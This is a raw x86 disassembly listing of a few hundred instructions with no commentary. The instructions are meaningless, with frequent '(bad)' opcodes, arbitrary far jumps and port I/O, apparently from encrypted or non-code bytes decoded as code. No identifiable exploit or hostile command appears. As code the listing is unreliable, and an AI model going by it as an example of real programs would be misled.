  40fccd:	shl    DWORD PTR [ebp+0x1b54672c],1
  40fcd3:	xchg   edx,eax
  40fcd4:	add    bh,BYTE PTR [ebp+eiz*1+0x2b]
  40fcd8:	xchg   edx,eax
  40fcd9:	sub    DWORD PTR [esi-0x3625d6c],eax
  40fcdf:	inc    ebp
  40fce0:	mov    DWORD PTR [ebp+ebx*2-0x10dbb043],ebp
  40fce7:	and    eax,0x3f31c322
  40fcec:	cmp    edx,DWORD PTR [ebx+0x69]
  40fcef:	jmp    0x8653:0xdeef9675
  40fcf6:	add    bh,BYTE PTR [ecx]
  40fcf8:	mov    WORD PTR [eax],?
  40fcfa:	mov    al,0x57
  40fcfc:	loop   0x40fd41
  40fcfe:	gs pop eax
  40fd00:	and    BYTE PTR [ebp+ebx*1-0x3c],ah
  40fd04:	(bad)  
  40fd05:	loope  0x40fd36
  40fd07:	je     0x40fd85
  40fd09:	(bad)  
  40fd0a:	xor    dl,BYTE PTR [ecx-0x37]
  40fd0d:	jno    0x40fca4
  40fd0f:	xchg   esi,eax
  40fd10:	cmc    
  40fd11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd12:	outs   dx,DWORD PTR ds:[esi]
  40fd13:	mov    ds:0x570ddf9f,eax
  40fd18:	jnp    0x40fcc2
  40fd1a:	enter  0x553a,0xa6
  40fd1e:	cwde   
  40fd1f:	in     eax,0x29
  40fd21:	push   edx
  40fd22:	push   ecx
  40fd23:	cdq    
  40fd24:	xor    eax,0xce37d41d
  40fd29:	xchg   ebp,eax
  40fd2a:	pop    edx
  40fd2b:	in     al,dx
  40fd2c:	add    DWORD PTR [edx+0x6144ce2a],ebp
  40fd32:	btc    DWORD PTR [esi-0x675a8975],ebx
  40fd39:	mov    ds:0xbc55b0c2,al
  40fd3e:	enter  0x704b,0x7b
  40fd42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd43:	pop    ebx
  40fd44:	push   0x923542f0
  40fd49:	mov    bh,al
  40fd4b:	ja     0x40fda9
  40fd4d:	jp     0x40fd6f
  40fd4f:	mov    ecx,0x31346892
  40fd54:	adc    edi,DWORD PTR [ecx-0x1c99c89f]
  40fd5a:	ins    BYTE PTR es:[edi],dx
  40fd5b:	pushf  
  40fd5c:	retf   
  40fd5d:	pushf  
  40fd5e:	sbb    ebp,DWORD PTR [ebp+0x4]
  40fd61:	mov    edi,0xb565044b
  40fd66:	xlat   BYTE PTR ds:[ebx]
  40fd67:	push   eax
  40fd68:	push   0xe658f010
  40fd6d:	dec    ax
  40fd6f:	and    DWORD PTR [edx-0x21fee17c],0x42648bb8
  40fd79:	lods   al,BYTE PTR ds:[esi]
  40fd7a:	xor    BYTE PTR [ecx*1+0x1b290b8a],al
  40fd81:	pop    ecx
  40fd82:	push   edx
  40fd83:	cmc    
  40fd84:	adc    eax,0xd57a12e1
  40fd89:	or     eax,0x841e19c6
  40fd8e:	mov    ds,WORD PTR [edx-0x57]
  40fd91:	nop
  40fd92:	aaa    
  40fd93:	push   esp
  40fd94:	mov    edi,0xa6756671
  40fd99:	mov    esp,0x2e1d1132
  40fd9e:	xchg   ecx,eax
  40fd9f:	push   0xffffff8c
  40fda1:	inc    ebx
  40fda2:	iret   
  40fda3:	iret   
  40fda4:	push   edi
  40fda5:	mov    ds:0xe9fcac06,eax
  40fdaa:	lahf   
  40fdab:	dec    esp
  40fdac:	inc    ebp
  40fdad:	push   0xffffffc8
  40fdaf:	xor    DWORD PTR [ebx-0x10],esp
  40fdb2:	pop    edi
  40fdb3:	mov    al,0x78
  40fdb5:	cmp    ecx,DWORD PTR [edi]
  40fdb7:	(bad)  
  40fdb8:	rol    DWORD PTR cs:0x645ac6b1,cl
  40fdbf:	retf   
  40fdc0:	div    BYTE PTR [ecx+0x7969426b]
  40fdc6:	jnp    0x40fdee
  40fdc8:	pop    ds
  40fdc9:	mov    WORD PTR [esi-0x592f3261],cs
  40fdcf:	adc    DWORD PTR [ebp+0x6079bde8],0x24
  40fdd6:	jns    0x40fe48
  40fdd8:	ror    DWORD PTR [ecx-0x65],0x6e
  40fddc:	lods   eax,DWORD PTR ds:[esi]
  40fddd:	in     eax,0xa6
  40fddf:	mov    ch,BYTE PTR [esi+0x72fdf5e3]
  40fde5:	fidivr DWORD PTR [esi-0x9]
  40fde8:	dec    ecx
  40fde9:	test   eax,0x45ec78cc
  40fdee:	push   0xffffffd0
  40fdf0:	stos   BYTE PTR es:[edi],al
  40fdf1:	loope  0x40fdf9
  40fdf3:	call   0xf1aa:0xaf8e76ea
  40fdfa:	pop    edi
  40fdfb:	sbb    ebx,0x4a
  40fdfe:	sbb    ebp,ebp
  40fe00:	in     eax,0x3b
  40fe02:	jb     0x40fe30
  40fe04:	retf   0x6fea
  40fe07:	out    dx,eax
  40fe08:	in     eax,0x40
  40fe0a:	jle    0x40fe51
  40fe0c:	shr    BYTE PTR [ebx-0x66],0xac
  40fe10:	mov    BYTE PTR [eax-0x6eee2d41],0x68
  40fe17:	lods   al,BYTE PTR ds:[esi]
  40fe18:	gs push ds
  40fe1a:	push   eax
  40fe1b:	push   esi
  40fe1c:	(bad)  
  40fe1d:	bound  eax,QWORD PTR [ebx+0x6cd590bd]
  40fe23:	out    0x93,eax
  40fe25:	fld    DWORD PTR [ecx+0x5]
  40fe28:	lods   al,BYTE PTR ds:[esi]
  40fe29:	test   eax,0xb93089bc
  40fe2e:	push   es
  40fe2f:	mov    ds:0xf90ea873,eax
  40fe34:	inc    ecx
  40fe35:	mov    ds:0x3fb66e87,al
  40fe3a:	xchg   esi,eax
  40fe3b:	jb     0x40fea5
  40fe3d:	outs   dx,BYTE PTR ds:[esi]
  40fe3e:	lahf   
  40fe3f:	cmc    
  40fe40:	push   eax
  40fe41:	loopne 0x40fe77
  40fe43:	daa    
  40fe44:	cdq    
  40fe45:	push   es
  40fe46:	fistp  QWORD PTR [edi+0x6d]
  40fe49:	test   DWORD PTR [ecx],ecx
  40fe4b:	sub    al,BYTE PTR [ebp+0x4a83aeac]
  40fe51:	dec    esi
  40fe52:	cmc    
  40fe53:	mov    al,0x8d
  40fe55:	xchg   esi,eax
  40fe56:	push   es
  40fe57:	icebp  
  40fe58:	stc    
  40fe59:	add    eax,0x32e230c1
  40fe5e:	push   ebp
  40fe5f:	pop    ecx
  40fe60:	imul   ebx,DWORD PTR [eax+0x39aca608],0x7f
  40fe67:	ins    DWORD PTR es:[edi],dx
  40fe68:	xchg   DWORD PTR [ebx+0x7afe447],eax
  40fe6e:	fimul  WORD PTR [ebx]
  40fe70:	xchg   DWORD PTR [edi+eax*1+0x33],edx
  40fe74:	sub    DWORD PTR [ebx+0x2c1da5e2],ebp
  40fe7a:	sbb    eax,0x70954992
  40fe7f:	add    al,0x37
  40fe81:	jmp    0x4aaf:0x501291f0
  40fe88:	xor    al,0x51
  40fe8a:	pop    ebp
  40fe8b:	jne    0x40fecd
  40fe8d:	(bad)  
  40fe8e:	pushf  
  40fe8f:	cmp    DWORD PTR [eax+0x52],ecx
  40fe92:	mov    ebp,0x3db80fbc
  40fe97:	add    eax,0xb7ea3a1b
  40fe9c:	and    ah,bl
  40fe9e:	nop
  40fe9f:	fwait
  40fea0:	fwait
  40fea1:	jecxz  0x40febf
  40fea3:	mov    al,0xa9
  40fea5:	data16 jns 0x40fe81
  40fea8:	pushf  
  40fea9:	inc    esi
  40feaa:	(bad)  [esi-0x4f]
  40fead:	std    
  40feae:	xchg   ch,bh
  40feb0:	adc    eax,0xaf3f7c5b
  40feb5:	push   es
  40feb6:	xor    BYTE PTR [edi+0xa38749],bl
  40febc:	inc    ebp
  40febd:	dec    edi
  40febe:	(bad)  
  40febf:	or     edx,DWORD PTR [ecx-0x4f6cd45c]
  40fec5:	cmp    BYTE PTR [edi+0x25],dh
  40fec8:	mov    ah,0x57
  40feca:	sbb    al,0x15
  40fecc:	cs int3 
  40fece:	sbb    BYTE PTR [ecx-0xc],al
  40fed1:	aad    0x7d
  40fed3:	stos   DWORD PTR es:[edi],eax
  40fed4:	fisttp WORD PTR ds:0x76372fe
  40feda:	mov    al,ds:0xf3e63d34
  40fee0:	(bad)  
  40fee1:	dec    eax
  40fee2:	stos   BYTE PTR es:[edi],al
  40fee3:	add    ebp,eax
  40fee5:	dec    ebx
  40fee6:	mov    esp,0xc0ac0617
  40feeb:	aad    0x19
  40feed:	(bad)  
  40feee:	in     eax,0x71
  40fef0:	and    bh,BYTE PTR [edx+edx*4+0x7a90c134]
  40fef7:	cs pushf 
  40fef9:	mov    esi,0x6c9f24e9
  40fefe:	jge    0x40ff1c
  40ff00:	scas   al,BYTE PTR es:[edi]
  40ff01:	retf   
  40ff02:	inc    ebp
  40ff03:	mov    eax,ds:0xfc4630cb
  40ff08:	or     al,0x9f
  40ff0a:	sub    ch,bl
  40ff0c:	cld    
  40ff0d:	out    0x89,al
  40ff0f:	or     edi,DWORD PTR [ebp+0x75255571]
  40ff15:	mov    al,ds:0x3666c485
  40ff1a:	sar    DWORD PTR [ebp-0x4c075a07],cl
  40ff20:	sub    al,0xe7
  40ff22:	mov    WORD PTR [edi+ebx*8],ds
  40ff25:	xor    eax,0xb4a50180
  40ff2a:	outs   dx,DWORD PTR ds:[esi]
  40ff2b:	sub    al,0x61
  40ff2d:	jmp    0xea8f4046
  40ff32:	sub    al,dh
  40ff34:	pop    ebp
  40ff35:	scas   eax,DWORD PTR es:[edi]
  40ff36:	and    ebp,DWORD PTR [eax+esi*4]
  40ff39:	or     DWORD PTR [edx],0x27
  40ff3c:	pop    ss
  40ff3d:	inc    edi
  40ff3e:	div    BYTE PTR [ebp+0x3bcce3e3]
  40ff44:	cmp    DWORD PTR [edx],edi
  40ff46:	mov    DWORD PTR [ebp-0x10cd78c2],ebp
  40ff4c:	clc    
  40ff4d:	push   esi
  40ff4e:	pop    ecx
  40ff4f:	lea    eax,[ebp-0x3ed82c1d]
  40ff55:	sbb    ecx,DWORD PTR [eax-0x1e]
  40ff58:	push   ss
  40ff59:	xchg   esi,eax
  40ff5a:	fwait
  40ff5b:	jo     0x40ff09
  40ff5d:	sbb    BYTE PTR ds:0xbf8fdcec,0x59
  40ff64:	popf   
  40ff65:	cmp    bh,BYTE PTR [ecx+0x2e]
  40ff68:	test   DWORD PTR [edi],esi
  40ff6a:	and    BYTE PTR [ecx+0x24b98ba1],al
  40ff70:	add    eax,0x90dc681c
  40ff75:	push   ss
  40ff76:	or     dl,bh
  40ff78:	fist   WORD PTR [eax+0x53]
  40ff7b:	shl    DWORD PTR [ebp+0x259e3383],1
  40ff81:	dec    ecx
  40ff82:	pop    edi
  40ff83:	ins    BYTE PTR es:[edi],dx
  40ff84:	xchg   esi,eax
  40ff85:	or     DWORD PTR [edx],ecx
  40ff87:	cld    
  40ff88:	aam    0x8a
  40ff8a:	mov    al,ds:0xc4f0a26f
  40ff8f:	fidivr WORD PTR [esi]
  40ff91:	jg     0x40ff70
  40ff93:	add    al,0xd5
  40ff95:	jl     0x40ff8c
  40ff97:	mov    WORD PTR [edi],fs
  40ff99:	addr16 out 0xc8,eax
  40ff9c:	inc    edi
  40ff9d:	sub    DWORD PTR [ebx+edi*8],0xffffff94
  40ffa1:	pop    edi
  40ffa2:	(bad)  
  40ffa3:	in     eax,0x7b
  40ffa5:	and    DWORD PTR [ebx],edi
  40ffa7:	leave  
  40ffa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffa9:	and    eax,0x8d02f4a2
  40ffae:	ror    DWORD PTR [ebp-0x49],0x66
  40ffb2:	fimul  DWORD PTR [ebp+0x5b]
  40ffb5:	or     al,0xb9
  40ffb7:	hlt    
  40ffb8:	xor    ecx,0x7d
  40ffbb:	or     eax,0x6ff35c93
  40ffc0:	add    ah,BYTE PTR ds:0xc977322e
  40ffc6:	das    
  40ffc7:	dec    esp
  40ffc8:	(bad)  
  40ffc9:	dec    DWORD PTR [edi]
  40ffcb:	cmp    edi,DWORD PTR [esp+eax*4+0x31]
  40ffcf:	fwait
  40ffd0:	jl     0x40ff91
  40ffd2:	dec    esp
  40ffd3:	jg     0x40ffda
  40ffd5:	lods   eax,DWORD PTR ds:[esi]
  40ffd6:	enter  0x75c8,0x1
  40ffda:	xchg   ecx,eax
  40ffdb:	sti    
  40ffdc:	sar    al,0x88
  40ffdf:	rcl    ebx,0x5b
  40ffe2:	mov    esp,esp
  40ffe4:	adc    al,0x21
  40ffe6:	push   ss
  40ffe7:	xchg   al,dh
  40ffe9:	dec    edi
  40ffea:	call   0x2a887352
  40ffef:	pop    es
  40fff0:	retf   0x1bc
  40fff3:	sub    bh,BYTE PTR [esi-0x2c4b753b]
  40fff9:	add    al,0x9
  40fffb:	mov    ebp,0x58b5a942
  410000:	push   edi
  410001:	add    BYTE PTR [edi],bl
  410003:	xor    DWORD PTR [eax+0x66],edx
  410006:	sub    DWORD PTR [esi],edx
  410008:	pop    edi
  410009:	inc    ebp
  41000a:	sbb    eax,DWORD PTR [edx-0x262f80f9]
  410010:	fmul   QWORD PTR [edi+0x40cfeba2]
  410016:	sbb    dh,BYTE PTR [ecx+0x4b3dcf60]
  41001c:	mov    ebx,0x17b59f44
  410021:	js     0x40ffe2
  410023:	outs   dx,DWORD PTR ds:[esi]
  410024:	xchg   ebx,eax
  410025:	add    DWORD PTR [esi],edx
  410027:	rcl    DWORD PTR [eax],cl
  410029:	xlat   BYTE PTR ds:[ebx]
  41002a:	push   esp
  41002b:	aaa    
  41002c:	jae    0x410046
  41002e:	sbb    bl,0x91
  410031:	pop    esi
  410032:	aaa    
  410033:	add    ebp,ecx
  410035:	or     DWORD PTR [esi+ebp*2],ecx
  410038:	push   ebp
  410039:	mov    ebx,0x950973fc
  41003e:	xchg   ebx,eax
  41003f:	fistp  WORD PTR [ebp-0x636d2ef8]
  410045:	sahf   
  410046:	add    BYTE PTR [ecx-0x301814e],ah
  41004c:	jecxz  0x410022
  41004e:	mov    eax,ds:0x545b72
  410053:	call   DWORD PTR [ebx+0x49a14972]
  410059:	mov    dl,BYTE PTR [edi+ebx*2-0x3]
  41005d:	mov    esi,edi
  41005f:	adc    eax,0x90b642d1
  410064:	pop    esi
  410065:	mov    al,0x77
  410067:	push   ecx
  410068:	add    edx,edx
  41006a:	inc    esp
  41006b:	sub    al,0x22
  41006d:	fsub   DWORD PTR [ebx-0x10]
  410070:	dec    edx
  410071:	sbb    al,0x5a
  410073:	xchg   ebx,eax
  410074:	xchg   esi,eax
  410075:	lea    ebp,[ebx+0x48]
  410078:	repnz adc DWORD PTR [ebp+eax*1-0x42],ecx
  41007d:	mov    ss,WORD PTR [eax]
  41007f:	(bad)  [eax-0x4d]
  410082:	jmp    0x410072
  410084:	out    0x59,eax
  410086:	aad    0x6e
  410088:	xchg   edi,eax
  410089:	jmp    0x41008f
  41008b:	test   eax,0xb423bde5
  410090:	lods   al,BYTE PTR ds:[esi]
  410091:	loopne 0x410036
  410093:	and    BYTE PTR [edi+0x2e2fce80],cl
  410099:	push   ebp
  41009a:	ins    BYTE PTR es:[edi],dx
  41009b:	add    edi,DWORD PTR [edi+0x104eaa7b]
  4100a1:	mov    BYTE PTR [ecx],bl
  4100a3:	cld    
  4100a4:	mov    ebp,0x97f0181d
  4100a9:	pop    edx
  4100aa:	imul   ecx,DWORD PTR [ecx],0x2bcddce2
  4100b0:	(bad)  
  4100b1:	aam    0x59
  4100b3:	into   
  4100b4:	(bad)  
  4100b5:	mov    al,ds:0xf44678c8
  4100ba:	into   
  4100bb:	mov    BYTE PTR [eax],bl
  4100bd:	lock adc dl,BYTE PTR [ecx+esi*1]
  4100c1:	sub    eax,0xf46debb2
  4100c6:	adc    DWORD PTR [eax+0x4c52ee09],0xb50bc456
  4100d0:	rcr    DWORD PTR [edi-0x7a],0xa5
  4100d4:	push   edi
  4100d5:	mov    edi,0xbae5dd7d
  4100da:	mov    bl,0x8c
  4100dc:	shl    eax,cl
  4100de:	into   
  4100df:	pop    edx
  4100e0:	jnp    0x410097
  4100e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100e3:	mov    esp,0x93cd2428
  4100e8:	sub    dh,dh
  4100ea:	xor    al,0x7a
  4100ec:	cmp    al,0x4d
  4100ee:	mov    edi,0x35f6c526
  4100f3:	inc    ebp
  4100f4:	hlt    
  4100f5:	mov    edi,0x51a097d7
  4100fa:	mov    esi,0xa126263e
  4100ff:	int    0xc3
  410101:	(bad)  
  410103:	out    0x50,eax
  410105:	or     eax,0xb26c7155
  41010a:	not    DWORD PTR [ebp-0x7110feb]
  410110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410111:	ja     0x4100e0
  410113:	outs   dx,BYTE PTR ds:[esi]
  410114:	or     cl,dl
  410116:	int    0x5d
  410118:	ds pusha 
  41011a:	hlt    
  41011b:	xchg   edx,eax
  41011c:	addr16 xchg esp,eax
  41011e:	cld    
  41011f:	enter  0x5fa3,0x40
  410123:	mov    al,ds:0x27a0142
  410128:	loop   0x4100c0
  41012a:	lds    esp,FWORD PTR [ebx+0x7a7cb324]
  410130:	cmp    BYTE PTR [edi-0x734aa147],cl
  410136:	in     eax,0xbd
  410138:	call   0xe0382f78
  41013d:	adc    DWORD PTR [edi],edx
  41013f:	test   dl,bl
  410141:	aas    
  410142:	lock xor al,0xb6
  410145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410146:	jmp    0x410193
  410148:	loop   0x41010f
  41014a:	addr16 (bad) 
  41014c:	fild   DWORD PTR [ebx-0x33]
  41014f:	cwde   
  410150:	pop    esi
  410151:	cmp    DWORD PTR [ecx],esp
  410153:	(bad)  
  410154:	and    BYTE PTR [edi-0x11],bh
  410157:	(bad)  
  410158:	in     eax,0xaf
  41015a:	sub    al,0xed
  41015c:	jne    0x410130
  41015e:	jae    0x41019d
  410160:	stc    
  410161:	dec    ebp
  410162:	jns    0x4100ef
  410164:	pop    ebx
  410165:	outs   dx,DWORD PTR ds:[esi]
  410166:	out    dx,eax
  410167:	inc    ebx
  410168:	sbb    ah,bh
  41016a:	fldcw  WORD PTR [ebp-0x2c86fe5f]
  410170:	xchg   edx,eax
  410171:	jecxz  0x41013e
  410173:	add    ebp,DWORD PTR [eax+0x7273039c]
  410179:	test   eax,0x7c21d57d
  41017e:	leave  
  41017f:	mov    esp,0x4201a81f
  410184:	mov    eax,ds:0xa31d03f9
  410189:	xlat   BYTE PTR ds:[ebx]
  41018a:	mov    bh,0x1b
  41018c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018d:	shl    DWORD PTR [esi],1
  41018f:	dec    ebx
  410190:	cmp    al,0x23
  410192:	push   esp
  410193:	or     edi,DWORD PTR [ecx+ecx*4]
  410196:	push   0x2c
  410198:	xchg   ecx,eax
  410199:	pop    eax
  41019a:	push   edx
  41019b:	push   edx
  41019c:	or     esi,DWORD PTR [esi]
  41019e:	mov    eax,ds:0x79392184
  4101a3:	jnp    0x410180
  4101a5:	sahf   
  4101a6:	scas   eax,DWORD PTR es:[edi]
  4101a7:	mov    BYTE PTR ds:0xf74c9303,al
  4101ad:	inc    ebx
  4101ae:	fcmovnbe st,st(6)
  4101b0:	pop    eax
  4101b1:	cld    
  4101b2:	test   dh,dh
  4101b4:	pop    esp
  4101b5:	je     0x41014e
  4101b7:	cld    
  4101b8:	mov    gs,esp
  4101ba:	adc    bh,BYTE PTR [edi+0x21]
  4101bd:	inc    eax
  4101be:	dec    ecx
  4101bf:	loopne 0x410179
  4101c1:	push   esp
  4101c2:	(bad)  
  4101c3:	jmp    0x6989:0x153d4fcf
  4101ca:	xchg   ecx,eax
  4101cb:	sahf   
  4101cc:	xor    bh,bh
  4101ce:	push   esp
  4101cf:	push   es
  4101d0:	jecxz  0x410220
  4101d2:	and    ch,al
  4101d4:	jnp    0x41021d
  4101d6:	retf   
  4101d7:	cmp    eax,0x4e2bcfd3
  4101dc:	lock dec ebp
  4101de:	mov    esp,0xcca5f84a
  4101e3:	rcl    BYTE PTR [edi],cl
  4101e5:	gs jno 0x410208
  4101e8:	inc    ebx
  4101e9:	cmp    eax,0xf396ed6e
  4101ee:	add    ebx,DWORD PTR [edi+0x19]
  4101f1:	jge    0x4101f6
  4101f3:	jae    0x410233
  4101f5:	inc    ebp
  4101f6:	inc    edx
  4101f7:	add    dl,al
  4101f9:	and    DWORD PTR [eax-0x24],ebx
  4101fc:	sahf   
  4101fd:	mov    WORD PTR [ebp-0x46],gs
  410200:	sub    edx,ebx
  410202:	lahf   
  410203:	cld    
  410204:	dec    eax
  410205:	xchg   ebx,eax
  410206:	ror    BYTE PTR [ebx+edi*1],cl
  410209:	and    ebp,ebx
  41020b:	gs ds imul ebp,esi,0xffffffc3
  410210:	arpl   WORD PTR [esi],sp
  410212:	mov    eax,0x57bad5db
  410217:	outs   dx,DWORD PTR ds:[esi]
  410218:	mov    edi,0xf4e1a6cc
  41021d:	inc    edx
  41021e:	jecxz  0x4101b5
  410220:	inc    ebp
  410221:	pop    edx
  410222:	sar    BYTE PTR [eax+0x12e8077c],1
  410228:	xor    ebp,ebx
  41022a:	dec    ecx
  41022b:	add    al,0x3f
  41022d:	cmp    ebx,DWORD PTR ds:0xd77889be
  410233:	add    ebx,DWORD PTR ds:0x7387ed1c
  410239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41023a:	and    eax,0x31a6122
  41023f:	icebp  
  410240:	clc    
  410241:	int    0x12
  410243:	mov    bl,0xee
  410245:	jae    0x41029e
  410247:	ins    DWORD PTR es:[edi],dx
  410248:	xor    DWORD PTR [ebp+0x5f0f639d],ebx
  41024e:	fs jno 0x410264
  410251:	xlat   BYTE PTR ds:[ebx]
  410252:	lds    ecx,FWORD PTR [edx]
  410254:	sbb    ah,BYTE PTR [ebx-0x5044c3f9]
  41025a:	jno    0x4102cf
  41025c:	shl    DWORD PTR [esi-0x14],1
  41025f:	aad    0x0
  410261:	push   ss
  410262:	outs   dx,BYTE PTR ds:[esi]
  410263:	cmp    ch,bl
  410265:	retf   0x274b
  410268:	or     DWORD PTR [esi],0x6e
  41026b:	loopne 0x41025f
  41026d:	xchg   ebx,eax
  41026e:	inc    edi
  41026f:	add    BYTE PTR [ecx],ch
  410271:	out    0x10,al
  410273:	cld    
  410274:	ret    0x543c
  410277:	das    
  410278:	pop    ds
  410279:	test   al,0xfa
  41027b:	or     ebp,DWORD PTR [ecx-0x65]
  41027e:	cld    
  41027f:	shl    DWORD PTR [ebp+esi*8-0x72],0x5c
  410284:	ret    0xa3e2
  410287:	push   0xffffffa2
  410289:	test   ah,bh
  41028b:	add    eax,0xbc9f9db2
  410290:	or     eax,0x24d9a02c
  410295:	add    al,0x8c
  410297:	pushf  
  410298:	les    esi,FWORD PTR [esi]
  41029a:	mov    ch,0xa7
  41029c:	xchg   esi,eax
  41029d:	rcl    DWORD PTR [ebx],1
  41029f:	push   ecx
  4102a0:	mov    ds:0x3e89c35f,eax
  4102a5:	popf   
  4102a6:	stos   BYTE PTR es:[edi],al
  4102a7:	in     eax,0x4e
  4102a9:	das    
  4102aa:	fidiv  DWORD PTR [ecx+edx*4-0x57]
  4102ae:	cli    
  4102af:	xchg   ebx,edx
  4102b1:	pop    ebp
  4102b2:	icebp  
  4102b3:	fwait
  4102b4:	repnz dec eax
  4102b6:	mov    BYTE PTR [ebx+0x33],dl
  4102b9:	mov    al,ds:0x7c8423c5
  4102be:	gs and al,0x2f
  4102c1:	jae    0x4102d7
  4102c3:	sbb    eax,0x27209ec0
  4102c8:	push   edi
  4102c9:	inc    ecx
  4102ca:	jne    0x4102e4
  4102cc:	cmp    bh,cl
  4102ce:	mov    bl,0x90
  4102d0:	stc    
  4102d1:	mov    edx,0x8dadb1ed
  4102d6:	inc    esp
  4102d7:	aad    0xef
  4102d9:	mov    dl,cl
  4102db:	sti    
  4102dc:	pop    es
  4102dd:	int3   
  4102de:	xchg   DWORD PTR [edi+0x51],edx
  4102e1:	inc    ebx
  4102e2:	jo     0x410328
  4102e4:	clc    
  4102e5:	pop    ebp
  4102e6:	aad    0xcc
  4102e8:	cdq    
  4102e9:	fucomi st,st(7)
  4102eb:	and    bl,BYTE PTR [ebx+edx*2+0x4e335a67]
  4102f2:	jne    0x41033a
  4102f4:	xchg   ecx,eax
  4102f5:	cmp    esp,DWORD PTR [ebx-0x5a404244]
  4102fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102fc:	aam    0x8e
  4102fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102ff:	xchg   edx,eax
  410300:	pop    es
  410301:	loopne 0x4102e2
  410303:	mov    dl,0x62
  410305:	inc    ebp
  410306:	js     0x410384
  410308:	adc    ebp,DWORD PTR [edx+ebx*2-0x57]
  41030c:	pushf  
  41030d:	push   ebx
  41030e:	push   es
  41030f:	in     al,0x61
  410311:	mov    al,ds:0xa3745c34
  410316:	jmp    FWORD PTR [esi]
  410318:	or     bl,bh
  41031a:	mov    bl,0xc7
  41031c:	into   
  41031d:	jl     0x4102a4
  41031f:	addr16 inc esp
  410321:	mov    edx,0x344ecf87
  410326:	ins    BYTE PTR es:[edi],dx
  410327:	adc    ch,dh
  410329:	aad    0x2b
  41032b:	daa    
  41032c:	shl    BYTE PTR ds:0x2afc3c53,1
  410332:	cwde   
  410333:	inc    ecx
  410334:	mov    DWORD PTR [esi],edi
  410336:	jo     0x41034b
  410338:	das    
  410339:	inc    eax
  41033a:	cmp    al,0x45
  41033c:	adc    eax,0xab8765d8
  410341:	push   esi
  410342:	rol    DWORD PTR [ebp+esi*2+0x34285ffd],1
  410349:	(bad)  
  41034a:	pop    ebp
  41034b:	pop    eax
  41034c:	or     BYTE PTR [edx-0x436c1f45],cl
  410352:	sub    al,0x5a
  410354:	fsubr  DWORD PTR [esi-0x43]
  410357:	cdq    
  410358:	add    eax,0xbd0af209
  41035d:	hlt    
  41035e:	cld    
  41035f:	xchg   ebp,eax
  410360:	mov    edi,0x872ed0cf
  410365:	cmp    ecx,ebx
  410367:	dec    edx
  410368:	push   edx
  410369:	inc    esi
  41036a:	in     eax,0x8e
  41036c:	add    esp,DWORD PTR [ebp+0x71]
  41036f:	lods   al,BYTE PTR ds:[esi]
  410370:	aas    
  410371:	pop    edx
  410372:	and    DWORD PTR [edx+0x4a885e2a],0xfffffffa
  410379:	sub    BYTE PTR [ecx],ah
  41037b:	xor    esi,eax
  41037d:	add    DWORD PTR ds:0xd9b59893,0x73
  410384:	and    DWORD PTR ds:0x2daf063a,ebp
  41038a:	mov    bh,0x4f
  41038c:	pop    edi
  41038d:	mov    ah,0x72
  41038f:	leave  
  410390:	xchg   esi,eax
  410391:	inc    esp
  410392:	adc    al,0x5b
  410394:	mov    ah,0x5c
  410396:	push   cs
  410397:	xchg   edx,eax
  410398:	sbb    esi,edx
  41039a:	call   0x1590:0x512c2d8
  4103a1:	cmp    BYTE PTR [ebp-0x52],dh
  4103a4:	mul    BYTE PTR [edi+0x61]
  4103a7:	out    0xb6,eax
  4103a9:	(bad)  
  4103aa:	fldcw  WORD PTR ds:0xdb9f53e6
  4103b0:	mov    ds:0xab147663,eax
  4103b5:	lock in al,0x78
  4103b8:	jmp    0x410407
  4103ba:	xchg   esp,eax
  4103bb:	xchg   edx,eax
  4103bc:	mov    al,ds:0xad7fac
  4103c1:	iret   
  4103c2:	lahf   
  4103c3:	aam    0xf1
  4103c5:	sbb    ah,BYTE PTR [ebx-0x2c0558b6]
  4103cb:	jl     0x410357
  4103cd:	push   cs
  4103ce:	int    0x1
  4103d0:	add    DWORD PTR [edi-0xe51b78],edx
  4103d6:	xchg   DWORD PTR ds:0x3dd93c67,esp
  4103dc:	aam    0xf
  4103de:	mov    ch,0xc5
  4103e0:	jno    0x4103ca
  4103e2:	rcr    DWORD PTR [esi+ecx*8],0x17
  4103e6:	fild   WORD PTR [edx]
  4103e8:	adc    al,bh
  4103ea:	retf   0x6495
  4103ed:	pop    edi
  4103ee:	call   0xad3a0763
  4103f3:	shl    ecx,cl
  4103f5:	or     DWORD PTR [edx],edx
  4103f7:	enter  0xe80c,0x10
  4103fb:	inc    eax
  4103fc:	js     0x4103ce
  4103fe:	out    dx,al
  4103ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410400:	fstp   DWORD PTR [esp+ecx*2-0x26d020d9]
  410407:	sbb    al,0xdd
  410409:	jo     0x410457
  41040b:	or     esp,eax
  41040d:	mov    ebp,0x83d78f67
  410412:	pop    eax
  410413:	scas   eax,DWORD PTR es:[edi]
  410414:	push   0x8ddd66ce
  410419:	int    0x5a
  41041b:	xchg   ecx,eax
  41041c:	sbb    DWORD PTR [eax+edi*8],eax
  41041f:	imul   esp,DWORD PTR [edi-0x18de4b2e],0xd5d1975
  410429:	not    ebp
  41042b:	xor    BYTE PTR [ebp+ebp*1+0x3e65b664],dh
  410432:	mov    al,ds:0x73d920d3
  410437:	sbb    al,0xae
  410439:	jmp    0xd27a1cbb
  41043e:	out    dx,al
  41043f:	mov    al,ds:0xdb3ddbac
  410444:	and    al,ah
  410446:	dec    esi
  410447:	scas   eax,DWORD PTR es:[edi]
  410448:	(bad)  
  410449:	xchg   ebx,eax
  41044a:	sbb    eax,0x1d64c4d0
  41044f:	retf   0x5352
  410452:	stos   BYTE PTR es:[edi],al
  410453:	mov    bl,0x77
  410455:	inc    ebx
  410456:	mov    al,ds:0x7b96d593
  41045b:	sbb    eax,0xcdc2a281
  410460:	and    al,0x45
  410462:	aam    0x23
  410464:	push   ebx
  410465:	loop   0x410429
  410467:	mov    bh,0x0
  410469:	inc    esi
  41046a:	dec    edx
  41046b:	sub    BYTE PTR [edx],dl
  41046d:	push   0xffffff88
  41046f:	inc    esp
  410470:	add    al,0x2b
  410472:	xchg   esi,eax
